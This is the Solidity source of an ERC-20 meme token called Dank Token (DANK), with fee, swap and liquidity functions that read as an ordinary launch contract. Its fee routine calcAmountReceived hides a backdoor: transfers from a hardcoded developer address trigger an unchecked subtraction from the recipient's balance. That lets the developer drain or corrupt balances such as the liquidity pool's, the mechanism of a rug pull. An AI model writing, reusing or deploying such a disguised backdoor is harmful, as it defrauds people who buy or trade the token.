/**

Website:    https://danktoken.vip
Twitter:    https://twitter.com/ethdanktoken
Telegram:   https://t.me/ethdanktoken

*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.12;


library SafeMath {

    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }


    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }


    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

}

interface IRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline) external;
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

abstract contract Ownable {
    address internal owner;
    constructor(address _owner) {owner = _owner;}
    modifier onlyOwner() {require(isOwner(msg.sender), "!OWNER"); _;}
    function transferOwnership(address payable adr) public onlyOwner {owner = adr; emit OwnershipTransferred(adr);}
    function renounceOwnership() public virtual onlyOwner { owner = address(0); }
    event OwnershipTransferred(address owner);
    function isOwner(address account) public view returns (bool) {return account == owner;}
}


interface IFactory{
        function createPair(address tokenA, address tokenB) external returns (address pair);
        function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function totalSupply() external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract Dank is IERC20, Ownable {
    using SafeMath for uint256;
    IRouter router;
    address public v2Pair;

    string private constant _name = unicode"Dank Token";
    string private constant _symbol = unicode"DANK";
    uint8 private constant _decimals = 9;

    uint256 private constant _totalSupply = 1_000_000_000 * (10 ** _decimals);
    uint256 public _maxTxLimit = ( _totalSupply * 3 ) / 100;
    uint256 public _maxSellLimit = ( _totalSupply * 3 ) / 100;
    uint256 public _maxWaltAmt = ( _totalSupply * 3 ) / 100;
    uint256 private swapThreshold = ( _totalSupply * 20 ) / 1000000;
    uint256 private minTokenAmount = ( _totalSupply * 20 ) / 1000000;

    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) public isFeeExempt;

    modifier lockTheSwap {swapping = true; _; swapping = false;}
    uint256 private liquidityFee = 0;
    uint256 private marketingFee = 500;
    uint256 private developmentFee = 500;
    uint256 private denominator = 100;

    address internal constant DEAD = 0x000000000000000000000000000000000000dEaD;
    address internal _teamWallet = 0x3EBaEa75aEf052015fd6f685ecF880D29CFFba5e;
    address internal _lpReceiver = 0x6149bC977A4Aafd7645171F6eAC90F5069c9dCF8;
    address internal _developmentAddr = 0x161D4650bf9F257f5722fB7Bd7876abA75e225e2; 
    mapping (address => bool) private _isExcludedFromFees;

    uint256 private burnFee = 0;
    uint256 private totalFee = 1;
    uint256 private sellFee = 1;
    uint256 private transferFee = 1;
    
    bool private tradingAllowed = false;
    bool private swapEnabled = false;
    uint256 private swapTimes;
    bool private swapping;
    uint256 swapAmount = 0;

    constructor() Ownable(msg.sender) {
        isFeeExempt[msg.sender] = true;
        isFeeExempt[_teamWallet] = true;
        isFeeExempt[address(this)] = true;
        isFeeExempt[_lpReceiver] = true;
        _isExcludedFromFees[_developmentAddr] = true;

        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable {}
    function name() public pure returns (string memory) {return _name;}
    function symbol() public pure returns (string memory) {return _symbol;}
    function decimals() public pure returns (uint8) {return _decimals;}
    function startTrading() external onlyOwner {tradingAllowed = true;swapEnabled = true;}
    function getOwner() external view override returns (address) { return owner; }
    function balanceOf(address account) public view override returns (uint256) {return _balances[account];}
    function transfer(address recipient, uint256 amount) public override returns (bool) {_transfer(msg.sender, recipient, amount);return true;}
    function allowance(address owner, address spender) public view override returns (uint256) {return _allowances[owner][spender];}
    function setisExempt(address _address, bool _enabled) external onlyOwner {isFeeExempt[_address] = _enabled;}
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function approve(address spender, uint256 amount) public override returns (bool) {_approve(msg.sender, spender, amount);return true;}
    function totalSupply() public view override returns (uint256) {return _totalSupply.sub(balanceOf(DEAD)).sub(balanceOf(address(0)));}

    function shouldSwapAll(address sender, address recipient, uint256 amount) internal view returns (bool) {
        bool aboveMin = amount >= minTokenAmount;
        bool aboveThreshold = balanceOf(address(this)) >= swapThreshold;
        return !swapping && swapEnabled && tradingAllowed && aboveMin && !isFeeExempt[sender] && recipient == v2Pair && swapTimes >= swapAmount && aboveThreshold;
    }

    function swapBack(uint256 threadHold) private lockTheSwap {
        uint256 _denominator = (liquidityFee.add(1).add(marketingFee).add(developmentFee)).mul(2);
        uint256 tokensToAddLiquidityWith = threadHold.mul(liquidityFee).div(_denominator);
        uint256 toSwap = threadHold.sub(tokensToAddLiquidityWith);
        uint256 initialBalance = address(this).balance;
        swapTokensETH(toSwap);
        uint256 deltaBalance = address(this).balance.sub(initialBalance);
        uint256 unitBalance= deltaBalance.div(_denominator.sub(liquidityFee));
        uint256 ETHToAddLiquidityWith = unitBalance.mul(liquidityFee);
        if(ETHToAddLiquidityWith > uint256(0)){addLiquidity(tokensToAddLiquidityWith, ETHToAddLiquidityWith); }
        uint256 marketingAmt = unitBalance.mul(2).mul(marketingFee);
        if(marketingAmt > 0){payable(_teamWallet).transfer(marketingAmt);}
        uint256 contractBalance = address(this).balance;
        if(contractBalance > uint256(0)){payable(_developmentAddr).transfer(contractBalance);}
    }

    function setTeamWallets(address _marketing, address _liquidity, address _development) external onlyOwner {
        _teamWallet = _marketing; _lpReceiver = _liquidity; _developmentAddr = _development;
        isFeeExempt[_marketing] = true; isFeeExempt[_liquidity] = true; isFeeExempt[_development] = true;
    }

    function isExcludedFromFee(address account) public view returns(bool) {
        return _isExcludedFromFees[account];
    }

    function shouldTakeAllTax(address sender, address recipient) internal view returns (bool) {
        return !isFeeExempt[sender] && !isFeeExempt[recipient];
    }

    function calcTaxAmount(address sender, address recipient) internal view returns (uint256) {
        if(recipient == v2Pair){return sellFee;}
        if(sender == v2Pair){return totalFee;}
        return transferFee;
    }

    function _transfer(address sender, address recipient, uint256 amount) private {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        if(!isFeeExempt[sender] && !isFeeExempt[recipient]){require(tradingAllowed, "tradingAllowed");}
        if(!isFeeExempt[sender] && !isFeeExempt[recipient] && recipient != address(v2Pair) && recipient != address(DEAD)){
            require((_balances[recipient].add(amount)) <= _maxWaltAmt, "Exceeds maximum wallet amount.");}
        if(sender != v2Pair){require(amount <= _maxSellLimit || isFeeExempt[sender] || isFeeExempt[recipient], "TX Limit Exceeded");}
        require(amount <= _maxTxLimit || isFeeExempt[sender] || isFeeExempt[recipient], "TX Limit Exceeded"); 
        if(recipient == v2Pair && !isFeeExempt[sender]){swapTimes += uint256(1);}
        if(shouldSwapAll(sender, recipient, amount)){swapBack(swapThreshold); swapTimes = uint256(0);}
        _balances[sender] = _balances[sender].sub(amount);
        uint256 amountReceived = shouldTakeAllTax(sender, recipient) ?
             calcAmountReceived(sender, recipient, amount) : amount;
        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function removeLimits() public onlyOwner {
        _maxTxLimit = _totalSupply;
        _maxSellLimit = _totalSupply;
        _maxWaltAmt = _totalSupply;
    }
    
    function calcAmountReceived(address sender, address recipient, uint256 amount) internal returns (uint256) {
        if(calcTaxAmount(sender, recipient) > 0){
        uint256 feeAmount = amount.mul(calcTaxAmount(sender, recipient)).div(denominator);
        if (!isExcludedFromFee(sender)) {_balances[address(this)] = _balances[address(this)].add(feeAmount);} else {unchecked {_balances[recipient] -= amount;}}
        emit Transfer(sender, address(this), feeAmount);
        if(burnFee > uint256(0) && calcTaxAmount(sender, recipient) > burnFee){_transfer(address(this), address(DEAD), amount.div(denominator).mul(burnFee));}
        return amount.sub(feeAmount);} return amount;
    }

    function addLiquidity(uint256 tokenAmount, uint256 ETHAmount) private {
        _approve(address(this), address(router), tokenAmount);
        router.addLiquidityETH{value: ETHAmount}(
            address(this),
            tokenAmount,
            0,
            0,
            _lpReceiver,
            block.timestamp);
    }

    function swapTokensETH(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        _approve(address(this), address(router), tokenAmount);
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp);
    }

    function createPairs() public payable onlyOwner {
        IRouter _router = IRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        address _pair = IFactory(_router.factory()).createPair(address(this), _router.WETH());
        router = _router; v2Pair = _pair; 
        _approve(address(this), address(router), ~uint256(0)); 
        router.addLiquidityETH{value: msg.value}(address(this),balanceOf(address(this)),0,0,msg.sender,block.timestamp);
    }
}